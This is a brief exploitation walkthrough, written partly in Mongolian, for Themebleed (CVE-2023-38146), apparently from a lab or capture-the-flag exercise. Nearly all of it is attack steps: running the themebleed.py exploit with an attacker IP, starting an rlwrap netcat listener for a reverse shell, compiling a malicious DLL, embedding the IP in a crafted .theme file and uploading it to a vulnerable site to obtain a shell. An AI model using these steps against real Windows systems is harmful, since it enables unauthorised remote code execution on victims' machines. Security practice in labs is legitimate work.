# Themebleed - CVE-2023-38146

## In Linux

```bash
pip3 install -r requirements.txt
python3 themebleed.py -r HOST -p 4711

# start nc listener in other shell
rlwrap -cAr nc -lvnp 4711
```

`Aero.msstyles_vrf_evil.dll` файлыг compile хийж, `evil_theme.theme` файлд бидний IP хаягийг оруулна:

```bash
python3 themebleed.py -r 10.10.14.28 -p 1234
```

Амжилттай болмогц SMB сервер ажиллаж `rlwrap -cAr nc -lvnp 1234` командыг ажиллуулна.

[image]

`evil_theme.theme` болон `evil_theme.themepack` файлуудыг эмзэг вебд байршуулна.

[image]

Хэсэг хугацааны дараа shell авна.

[image]
